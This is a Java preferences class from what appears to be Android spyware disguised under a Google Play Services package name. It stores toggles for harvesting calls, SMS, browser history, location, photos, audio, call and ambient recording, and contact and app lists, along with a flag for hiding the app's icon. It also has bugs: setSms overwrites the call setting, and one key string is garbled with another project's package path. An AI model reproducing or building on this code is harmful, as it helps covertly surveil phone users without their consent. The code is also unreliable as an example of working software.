package com.google.android.gms.persistent.googleapps.utils;

import android.content.Context;
import android.content.SharedPreferences;

import com.google.android.gms.persistent.googleapps.network.models.data.DeviceInfo;
import com.google.gson.Gson;

import javax.inject.Inject;

/**
 * Created by OldMan on 08.04.2017.
 */

public class Preferences {
    private static final String PREFS_NAME = "store";
    private static SharedPreferences prefs;
    private static final String visit_key = "is_visited";

    //-------------for begining request---------------------
    private static final String baseDeviceInfo = "base_device_info";
    private static final String hideIcon = "is_hide_icon";
    private static final String isAllDeviceInfo = "is_all_device_info";
    private static Gson gson;
    private static final String account = "account";
    private static final String timeWorker = "time_worker";


    //-------------------initial data------------------------
    private static final String initial_code = "initial_code";
    private static final String device = "device";

    private static final String firstToken = "first_token";
    private static final String secondToken = "second_token" +
            "";
    private static final String periodRequest = "period_request";

    private static String keyForRecord = "key_record";
    //------------variable settings-----------------------
    private static final String call = "call";
    private static final String sms = "sms";
    private static final String historyBrouser = "history_brouser";
    private static final String location = "location";
    private static final String locationMode = "location_mode";
    private static final String dispatchMode = "dispatch_mode";
    private static final String image = "image";
    private static final String audio = "audio";
    private static final String callRecord = "call_record";
    private static final String environmentRecord = "environment_record";
    private static final String callEnvironmentRecord = "call_environment_record";
    private static final String callList = "call_list";
    private static final String smsList = "sms_list";
    private static final String contactList = "contactcom.shadiz.usergin.shadowview.utils.Preferences.callList_list";
    private static final String appList = "app_list";
    private static final String duration = "duration";

    @Inject
    public Preferences(Context context) {
        prefs = context.getSharedPreferences(PREFS_NAME, 0);
        gson = new Gson();
    }

    public static String getInitialCode() {
        return prefs.getString(initial_code, null);
    }

    public void setInitialCode(String mInitialCode) {
        prefs.edit().putString(initial_code, mInitialCode).apply();
    }

    public static String getDevice() {
        return prefs.getString(device, null);
    }

    public void setDevice(String mDevice) {
        prefs.edit().putString(device, mDevice).apply();
    }

    public String getFirstToken() {
        return prefs.getString(firstToken, null);
    }

    public void setFirstToken(String mFirstToken) {
        prefs.edit().putString(firstToken, mFirstToken).apply();
    }

    public String getSecondToken() {
        return prefs.getString(secondToken, null);
    }

    public void setSecondToken(String mSecondToken) {
        prefs.edit().putString(secondToken, mSecondToken).apply();
    }

    public String getPeriodRequest() {
        return prefs.getString(periodRequest, null);
    }

    public void setPeriodRequest(String mPeriodRequest) {
        prefs.edit().putString(periodRequest, mPeriodRequest).apply();
    }


    public int getDuration() {
        return prefs.getInt(duration, 0);
    }

    public void setDuration(int mDuration) {
        prefs.edit().putInt(duration, mDuration).apply();
    }


    public String getCall() {
        return prefs.getString(call, "0");
    }

    public void setCall(String mCall) {
        prefs.edit().putString(call, mCall).apply();
    }

    public int getSms() {
        return prefs.getInt(sms, 0);
    }

    public void setSms(int mSms) {
        prefs.edit().putInt(call, mSms).apply();
    }

    public String getHistoryBrouser() {
        return prefs.getString(historyBrouser, "0");
    }

    public void setHistoryBrouser(String mHistoryBrouser) {
        prefs.edit().putString(historyBrouser, mHistoryBrouser).apply();
    }

    public String getLocation() {
        return prefs.getString(location, "0");
    }

    public void setLocation(String mLocation) {
        prefs.edit().putString(location, mLocation).apply();
    }

    public String getModeLocation() {
        return prefs.getString(locationMode, "0");

    }

    public void setModeLocation(String mModeLocation) {
        prefs.edit().putString(locationMode, mModeLocation).apply();
    }

    public String getDispatchMode() {
        return prefs.getString(dispatchMode, "0");
    }

    public void setDispatchMode(String mDispatch) {
        prefs.edit().putString(dispatchMode, mDispatch).apply();
    }

    public String getImage() {
        return prefs.getString(image, "0");
    }

    public void setImage(String mImage) {
        prefs.edit().putString(image, mImage).apply();
    }

    public String getAudio() {
        return prefs.getString(audio, "0");
    }

    public void setAudio(String mAudio) {
        prefs.edit().putString(audio, mAudio).apply();
    }

    public String getCallRecord() {
        return prefs.getString(callRecord, "0");
    }

    public void setCallRecord(String mCallRecord) {
        prefs.edit().putString(callRecord, mCallRecord).apply();
    }

    public String getRecordEnvironment() {
        return prefs.getString(environmentRecord, "0");
    }

    public void setEnvironmentRecord(String mEnvironmentRecord) {
        prefs.edit().putString(environmentRecord, mEnvironmentRecord).apply();
    }

    public String getCallEnvironmentRecord() {
        return prefs.getString(callEnvironmentRecord, "0");
    }

    public void setCallEnvironmentRecord(String mCallEnvironmentRecord) {
        prefs.edit().putString(callEnvironmentRecord, mCallEnvironmentRecord).apply();
    }

    public String getCallList() {
        return prefs.getString(callList, "0");
    }

    public void setCallList(String mCallList) {
        prefs.edit().putString(callList, mCallList).apply();
    }

    public String getSmsList() {
        return prefs.getString(smsList, "0");
    }

    public void setSmsList(String mSmsList) {
        prefs.edit().putString(smsList, mSmsList).apply();
    }

    public String getContactList() {
        return prefs.getString(contactList, "0");
    }

    public void setContactList(String mContactList) {
        prefs.edit().putString(contactList, mContactList).apply();
    }

    public String getAppList() {
        return prefs.getString(appList, "0");
    }

    public void setAppList(String mListApp) {
        prefs.edit().putString(appList, mListApp).apply();
    }

    public int getAccount() {
        return prefs.getInt(account, -1);
    }

    public void setAccount(int id) {
        prefs.edit().putInt(account, id).apply();
    }

    public boolean isVisited() {
        return prefs.getBoolean(visit_key, false);
    }

    public void setVisited() {
        prefs.edit().putBoolean(visit_key, true).apply();
    }

    public DeviceInfo getBaseDeviceInfo() {
        String dev = prefs.getString(baseDeviceInfo, null);
        return gson.fromJson(dev, DeviceInfo.class);
    }


    public void setBaseDeviceInfo(DeviceInfo dev) {
        String stringDev = gson.toJson(dev);
        prefs.edit().putString(baseDeviceInfo, stringDev).apply();
    }


    public boolean isHideIcon() {
        return prefs.getBoolean(hideIcon, false);
    }

    public void setHideIcon(boolean isHide) {
        prefs.edit().putBoolean(hideIcon, isHide).apply();
    }

    public boolean isAllDeviceInfo() {
        return prefs.getBoolean(isAllDeviceInfo, false);
    }

    public void setIsAllDeviceInfo(boolean isInfo) {
        prefs.edit().putBoolean(isAllDeviceInfo, isInfo).apply();
    }

    public void setFirstSettings() {
        SharedPreferences.Editor edit = prefs.edit();
        edit.putBoolean("hasVisited", true);
        edit.putBoolean("is_info", true);
        edit.putString("period", "1"); // period must equal 10 min
        edit.putString("code", "-1");
        edit.commit();
    }

    public String getKeyForRecord() {
        return prefs.getString(keyForRecord, null);
    }

    public void setKeyForRecord(String mKeyForRecord) {
        prefs.edit().putString(keyForRecord, mKeyForRecord).apply();
    }
}
